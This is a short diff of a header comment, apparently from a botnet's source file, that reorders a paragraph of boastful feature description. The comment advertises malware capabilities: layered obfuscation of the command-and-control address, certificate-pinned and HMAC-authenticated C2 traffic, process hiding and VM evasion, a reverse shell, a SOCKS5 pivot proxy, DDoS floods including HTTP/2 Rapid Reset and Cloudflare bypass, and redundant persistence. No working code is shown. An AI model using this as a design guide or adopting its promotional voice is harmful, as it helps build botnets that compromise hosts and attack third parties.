@@ -21,14 +21,6 @@
 //  You throw it in strings? You get nothing. The address resolution alone is five layers deep — Base64 into XOR
 //  into RC4 into substitution into MD5 verification back through AES. 
 //
-//  Comms are TLS-pinned server cert fingerprint baked into the binary. You
-//  MITM this and the handshake dies before you see anything. Run wireshark on us
-//  you'll get a bunch of encrypted garbage back over port 443. 
-//
-//  HMAC challenge-response. Server sends a nonce, bot proves it knows the key without ever sending it. No key, no joining the c2.
-//  Replay old auth? Nonce is fresh every session. This isn't Mirai's plaintext
-//  password-over-TCP clown show.
-//
 //  It daemonizes like a proper Unix citizen. Fork. Setsid. Redirect every
 //  file descriptor to /dev/null. Mask the signals. Disappear into the
 //  process table like it was never there. And if you're running it in a VM?
@@ -38,6 +30,11 @@
 //  The payload suite is disgusting. Full reverse shell with output capture.
 //  SOCKS5 proxy with auth. Pivot through the infected host like it's your
 //  personal VPS. L4 and L7 flood engine with session-aware HTTP/2, Proxy Support, Rapid Reset, CF Bypass, ETC. 
+//
+//  Comms are TLS-pinned server cert fingerprint baked into the binary. Run wireshark and
+//  you'll get a bunch of encrypted garbage back over port 443. 
+//  HMAC challenge-response. Server sends a nonce, bot proves it knows the key without ever sending it. Wrong response, no joining the c2.
+//  Replay old auth? Nonce is fresh every session.
 //
 //  It locks to a single instance. It reaps old PIDs so
 //  there's never two of it running. And persistence? Triple redundant —
